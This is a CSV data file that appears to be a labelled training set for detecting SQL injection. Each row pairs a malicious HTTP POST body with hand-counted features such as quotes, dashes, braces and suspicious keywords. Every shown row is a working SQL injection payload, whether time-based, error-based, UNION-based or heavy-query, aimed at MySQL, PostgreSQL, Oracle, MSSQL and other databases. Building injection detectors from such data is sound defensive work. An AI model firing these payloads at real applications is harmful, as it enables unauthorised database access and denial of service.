method,body,class,single_q,double_q,dashes,braces,spaces,badwords,path
POST,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,1,3,0,0,5,29,3,
POST,"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,1,0,4,0,14,77,3,
POST,"1""  )   union all select null,null,null,null,null--",1,0,1,3,1,8,3,
POST,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'moyb'  =  'moyb",1,4,0,0,30,148,5,
POST,select pg_sleep  (  5  )   and    (    (     (  'mgbm' like 'mgbm,1,3,0,0,5,27,3,
POST,"1'   )    )    union all select null,null,null,null,null,null--",1,1,0,3,2,14,3,
POST,1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'iuki'  =  'iuki,1,4,0,0,38,190,6,
POST,"1%""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,0,4,0,10,58,2,
POST,"1%""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,2,1,3,9,46,2,
POST,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'eflk'  =  'eflk",1,4,0,0,12,69,5,
POST,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,0,1,0,10,49,5,
POST,1   )    )    as bjxd where 4299  =  4299,1,0,0,0,2,18,2,
POST,1'  )   where 9817  =  9817,1,1,0,0,1,10,1,
POST,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",1,4,0,0,10,61,5,
POST,"1%""   )    )     )   or sleep  (  5  )   and    (    (     (  ""%""  =  """,1,0,4,0,8,44,3,
POST,1 where 8180  =  8180 or sleep  (  5  )  #,1,0,0,0,2,16,3,
POST,"-8312%""   )    )    union all select 4972--",1,0,1,4,2,14,3,
POST,1'||  (  select 'pmpd' where 9803  =  9803,1,3,0,0,1,11,2,
POST,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'xori' like 'xori",1,3,0,0,7,37,5,
POST,-5432'  )   as dndq where 9633  =  9633 order by 1#,1,1,0,1,1,15,4,
POST,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq",1,3,0,0,7,39,4,
POST,1 where 8095  =  8095,1,0,0,0,0,6,1,
POST,"1""  )   where 8196  =  8196",1,0,1,0,1,10,1,
POST,1  )   where 2010  =  2010,1,0,0,0,1,10,1,
POST,"1%""   )    )     )   and sleep  (  5  )  #",1,0,1,0,5,24,2,
POST,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,1,0,4,0,4,36,5,
POST,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,0,3,7,41,3,
POST,1'  )   where 6045  =  6045,1,1,0,0,1,10,1,
POST,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,0,0,3,8,51,5,
POST,"1""  )   where 2702  =  2702 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,0,1,3,11,56,3,
POST,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""ctrr""  =  ""ctrr",1,0,4,0,8,49,5,
POST,-8187'   )    )     )   or 1698  =  2823#,1,1,0,1,3,20,1,
POST,"-3347%"" or 9323  =  9323#",1,0,1,1,0,6,1,
POST,"1%"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,1,3,16,70,1,
POST,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",1,4,0,0,14,77,3,
POST,1'   )    )    as qaki where 5272  =  5272,1,1,0,0,2,18,2,
POST,1'||  (  select 'bqhi' from dual where 7409  =  7409,1,3,0,0,1,13,3,
POST,"-2325  )   union all select 4692,4692,4692,4692#",1,0,0,1,1,8,3,
POST,"-1418""  )   where 7528  =  7528 order by 1#",1,0,1,1,1,13,3,
POST,"1%'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  '%'  =  '",1,4,0,0,12,60,3,
POST,1'   )    )    as tley where 3539  =  3539,1,1,0,0,2,18,2,
POST, (  select   (  case when   (  6461  =  1802  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1,0,0,0,10,57,5,
POST,"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""ilge"" like ""ilge",1,0,4,0,10,56,3,
POST,-6518'   )    )    as vocx where 2539  =  2539 or   (  8652  =  2025  )  *2025--,1,1,0,4,4,32,3,
POST,"1%"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,1,3,4,30,4,
POST,"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",1,4,0,0,6,38,3,
POST,"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,1,0,4,0,16,87,7,
POST,"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,0,1,3,19,103,11,
POST,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""ewsr"" like ""ewsr",1,2,3,0,10,51,4,
POST,"1""   )    )    and 5421  =  4804--",1,0,1,3,2,16,1,
POST,1'||  (  select 'zzkx' where 3270  =  3270 and 2006  =  2006,1,3,0,0,1,17,3,
POST,"  (  select   (  case when   (  3531  =  3531  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 3531 end   )    )   ",1,0,0,0,10,71,11,
POST,select   (  case when   (  4205  =  9574  )   then 4205 else 1/  (  select 0  )   end  )  --,1,0,0,3,6,37,2,
POST,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",1,1,0,4,2,14,3,
POST,"1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#",1,1,0,0,1,16,5,
POST,1'  )   and   (  3020  =  3020  )  *6703 and   (  'rskq'  =  'rskq,1,4,0,0,4,28,2,
POST,"-5205'   )    )    union all select 8592,8592,8592,8592,8592,8592--",1,1,0,4,2,14,3,
POST,"1""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""vjvz"" like ""vjvz",1,0,4,0,8,63,13,
POST,"1   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   5200  =  5200",1,0,0,0,8,65,12,
POST,1'   )    )    and 2832  =  4165--,1,1,0,3,2,16,1,
POST,1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',1,2,0,0,10,56,7,
POST,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",1,4,0,0,22,104,2,
POST,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",1,4,0,0,6,38,3,
POST,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,1,3,0,0,4,25,2,
POST,"-5518  )   as yvqm where 7360  =  7360 union all select 7360,7360#",1,0,0,1,1,16,5,
POST,-3359' order by 1--,1,1,0,4,0,3,2,
POST,"-6618""   )    )     )   order by 1#",1,0,1,1,3,17,2,
POST,"1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,3,0,3,5,42,9,
POST,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,0,1,3,6,37,3,
POST,"-3628"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,0,1,1,34,159,3,
POST,"-6492'  )   union all select 7204,7204--",1,1,0,4,1,8,3,
POST,"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""nnmz"" like ""nnmz",1,0,4,0,6,42,6,
POST,"-1755%' union all select 2615,2615,2615,2615,2615,2615#",1,1,0,1,0,4,3,
POST,"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",1,0,0,4,3,18,3,
POST,"1',  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1,0,0,18,92,6,
POST,1' where 5060  =  5060,1,1,0,0,0,6,1,
POST,"-7574%""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1,0,4,1,32,156,5,
POST,"-9347'  )   union all select 3884,3884#",1,1,0,1,1,8,3,
POST,"1"" where 5333  =  5333 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,1,3,16,76,2,
POST,"-4807' where 3232  =  3232 or make_set  (  6599  =  5179,5179  )  --",1,1,0,4,2,20,2,
POST,1 where 1015  =  1015,1,0,0,0,0,6,1,
POST,"  (  select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ",1,2,0,0,10,45,2,
POST,"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1,0,4,0,34,165,4,
POST,"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1,1,0,0,21,111,14,
POST,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,0,0,0,5,28,2,
POST,"1'+  (  select 'nmhy' where 2919  =  2919 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,3,0,3,5,42,9,
POST,1'||  (  select 'boxx' where 2038  =  2038 and 9198  =  9198--,1,3,0,3,1,17,3,
POST,"1%""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0,1,3,5,35,7,
POST,"-4304' where 1005  =  1005 union all select 1005,1005#",1,1,0,1,0,10,4,
POST,"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1,0,0,0,5,28,2,
POST,1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1,4,0,0,6,42,5,
POST,"1%'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  '%'  =  '",1,4,0,0,10,58,2,
POST,"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",1,4,0,0,14,71,3,
POST,"1  )   where 8164  =  8164 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,0,3,5,43,9,
POST,1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'nxkp' like 'nxkp,1,4,0,0,32,156,6,
POST,-2625'   )    )    or 3038  =  3038,1,1,0,1,2,16,1,
POST,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",1,4,0,0,8,57,8,
POST,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",1,0,4,0,4,35,9,
POST,"1%""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,1,0,4,0,14,80,2,
POST,"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#",1,1,0,0,2,22,5,
POST,"1""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dwcy""  =  ""dwcy",1,0,4,0,38,190,6,
POST,"-1218' union all select 2663,2663,2663,2663--",1,1,0,4,0,4,3,
POST,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,0,0,9,43,4,
POST,"1  )   union all select null,null,null#",1,0,0,0,1,8,3,
POST,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""oiuw""  =  ""oiuw",1,0,3,0,13,63,4,
POST,"1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,0,0,15,68,1,
POST,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'qvoy'  =  'qvoy",1,3,0,0,5,36,4,
POST,"-5160'  )   as kgjw where 9609  =  9609 union all select 9609,9609--",1,1,0,4,1,16,5,
POST,1%'   )    )     )   waitfor delay '0:0:5' and    (    (     (  '%'  =  ',1,6,0,0,6,37,3,
POST,"-5187""  )   union all select 3373,3373#",1,0,1,1,1,8,3,
POST,"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",1,1,0,1,2,14,3,
POST,"-7240'   )    )    union all select 8064,8064,8064#",1,1,0,1,2,14,3,
POST,1'+  (  select 'rajp' where 3300  =  3300,1,3,0,0,1,11,2,
POST,"1%'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  '%'  =  '",1,4,0,0,24,128,8,
POST,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",1,0,4,0,12,63,4,
POST,"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,0,3,6,43,8,
POST,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,1,0,0,1,8,48,2,
POST,"-5819%""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,1,0,4,1,42,203,7,
POST,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1,1,0,0,9,39,0,
POST,"1"" where 3692  =  3692 union all select null,null--",1,0,1,3,0,10,4,
POST,1   )    )    as uqsi where 1644  =  1644 and 9198  =  9198--,1,0,0,3,2,24,3,
POST,"-2423'   )    )     )   union all select 8256,8256,8256,8256,8256,8256,8256,8256--",1,1,0,4,3,18,3,
POST,select   (  case when   (  2717  =  2634  )   then 2717 else 2717*  (  select 2717 from mysql.db  )   end  )  #,1,0,0,0,6,39,3,
POST,"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",1,0,1,4,1,8,3,
POST,1%'   )    )    and sleep  (  5  )  #,1,1,0,0,4,20,2,
POST,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",1,0,1,1,1,16,5,
POST,1'  )   where 2090  =  2090,1,1,0,0,1,10,1,
POST,1' and 1661  =  1244 and 'dcha'  =  'dcha,1,4,0,0,0,12,2,
POST,"-1372%'   )    )     )   union all select 8403,8403,8403,8403#",1,1,0,1,3,18,3,
POST,1 where 9774  =  9774,1,0,0,0,0,6,1,
POST,1   )    )    and 3249  =  2985,1,0,0,0,2,16,1,
POST,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",1,0,0,4,0,4,3,
POST,"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",1,1,0,3,3,26,3,
POST,"1   )    )    as jfae where 6684  =  6684 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,0,3,6,57,13,
POST,"1   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0,0,3,6,41,7,
POST,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,0,0,6,34,1,
POST,"1""   )    )    as tmpz where 7224  =  7224 and make_set  (  3579  =  1045,1045  )  --",1,0,1,3,4,32,3,
POST,"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",1,0,0,4,2,20,2,
POST,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1,0,1,3,4,33,4,
POST,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,1,0,3,8,45,6,
POST,"1'||  (  select 'hrpa' where 1973  =  1973 union all select null,null,null,null,null,null,null,null,null--",1,3,0,3,1,15,5,
POST,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue",1,4,0,0,12,58,4,
POST,"1""  )   where 2215  =  2215 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,0,1,3,39,187,7,
POST,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl,1,0,0,0,8,40,5,
POST,1  )   as ilqx where 8547  =  8547,1,0,0,0,1,12,2,
POST,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,0,1,0,9,43,5,
POST,"1'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0,3,18,80,1,
POST,"1""  )   where 6236  =  6236 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,0,1,0,5,34,3,
POST,"1""   )    )    and   (  7467  =  7962  )  *7962 and    (    (   ""nhld""  =  ""nhld",1,0,4,0,6,40,2,
POST,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,1,4,0,0,10,67,4,
POST,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl",1,3,0,0,4,31,8,
POST,select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #,1,0,0,0,6,39,3,
POST,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,1,4,0,0,10,53,6,
POST,"-1475""  )   union all select 8611,8611,8611#",1,0,1,1,1,8,3,
POST,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",1,1,0,3,1,16,5,
POST,"1'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,0,3,7,45,7,
POST,select   (  case when   (  5752  =  6036  )   then 1 else 5752*  (  select 5752 from master..sysdatabases  )   end  )  --,1,0,0,3,6,39,3,
POST,1'||  (  select 'sbft' where 8748  =  8748,1,3,0,0,1,11,2,
POST,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",1,0,1,3,3,24,2,
POST,"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",1,3,0,1,1,17,6,
POST,"1"" where 8089  =  8089",1,0,1,0,0,6,1,
POST,-2936  )   or 6872  =  6872,1,0,0,1,1,10,1,
POST,"1'||  (  select 'ryom' where 1134  =  1134 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,3,0,3,17,81,3,
POST,"1%'   )    )     )   union all select null,null,null,null,null,null,null#",1,1,0,0,3,18,3,
POST,"1'||  (  select 'xjtq' from dual where 5719  =  5719 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1,4,0,0,6,50,10,
POST,"1%""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""%""  =  """,1,0,4,0,8,50,3,
POST,"1%""  )   rlike   (  select   (  case when   (  7736  =  7642  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """,1,0,4,0,8,54,2,
POST,1'  )   and 7533  =  7533 and   (  'dbjq'  =  'dbjq,1,4,0,0,2,20,2,
POST,"1""  )   where 9827  =  9827",1,0,1,0,1,10,1,
POST,"1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#",1,0,1,0,1,16,5,
POST,"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,0,0,0,13,66,3,
POST,"1  )   as obhj where 1789  =  1789 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,0,0,3,11,58,4,
POST,1'  )   where 1502  =  1502 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,1,0,3,39,187,7,
POST,"1'  )   union all select null,null,null,null,null,null,null--",1,1,0,3,1,8,3,
POST,"1%"" waitfor delay '0:0:5' and ""%""  =  """,1,2,4,0,0,9,3,
POST,1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,1,4,0,0,4,30,3,
POST,"-5278""   )    )     )   union all select 5264,5264,5264#",1,0,1,1,3,18,3,
POST,-3462'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'cxku' like 'cxku,1,4,0,1,32,158,6,
POST,1'||  (  select 'boib' where 9595  =  9595,1,3,0,0,1,11,2,
POST,"1%' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,0,3,10,46,2,
POST,"-4934"" union all select 5119,5119,5119,5119,5119--",1,0,1,4,0,4,3,
